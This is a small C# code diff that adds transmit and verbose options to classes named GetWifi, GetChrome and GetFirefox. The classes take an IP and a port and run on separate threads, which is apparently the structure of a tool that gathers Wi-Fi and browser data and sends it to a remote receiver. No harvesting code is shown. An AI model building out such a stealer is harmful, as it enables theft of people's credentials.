@@ -18,10 +18,9 @@ namespace PS03
             // If the receiver is set, we should not run operations
             if (!options.Receive)
             {
-                var wifi = new GetWifi(options.Ip,options.Port);
-                var chrome = new GetChrome(options.Ip,options.Port);
-                var firefox = new GetFirefox(options.Ip,options.Port);
-
+                var wifi = new GetWifi(options.Ip,options.Port,options.Transmit,options.Verbose);
+                var chrome = new GetChrome(options.Ip, options.Port, options.Transmit, options.Verbose);
+                var firefox = new GetFirefox(options.Ip, options.Port, options.Transmit, options.Verbose);
 
                 var T_WIFI = new Thread(wifi.Execute);
                 var T_CHROME = new Thread(chrome.Execute);
